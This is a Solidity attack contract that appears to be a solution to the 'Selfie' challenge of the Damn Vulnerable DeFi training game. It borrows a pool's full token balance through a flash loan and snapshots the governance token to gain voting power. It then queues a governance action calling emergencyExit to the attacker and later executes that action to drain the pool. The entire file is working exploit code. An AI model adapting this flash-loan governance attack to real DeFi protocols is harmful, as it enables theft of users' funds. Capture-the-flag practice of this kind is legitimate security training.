pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/ISimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "hardhat/console.sol";

contract AttackSelfie {
    address public _owner;
    SelfiePool public _pool;
    address public _token;
    uint256 public _actionId;

    constructor(address owner, address pool, address token) {
        _owner = owner;
        _pool = SelfiePool(pool);
        _token = token;
    }

    function attackQueueAction() public  {
        require(msg.sender == _owner, "not owner");

        uint256 amount = _pool.token().balanceOf(address(_pool));
        

        _pool.flashLoan(IERC3156FlashBorrower(address(this)), _token, amount, "");
    }

    function attackQueueExecute() public {
        require(msg.sender == _owner, "not owner");

        _pool.governance().executeAction(_actionId);
    }

    function onFlashLoan(address borrower, address token, uint256 amount, uint256 fee, bytes calldata _data) external returns (bytes32) {
        require(msg.sender == address(_pool), "not pool");

        console.log("onFlashLoan", address(this), DamnValuableTokenSnapshot(token).balanceOf(address(this)));

        DamnValuableTokenSnapshot(token).snapshot();

        _actionId = _pool.governance().queueAction(address(_pool), 0, abi.encodeWithSignature("emergencyExit(address)", _owner));
        DamnValuableTokenSnapshot(token).approve(address(_pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}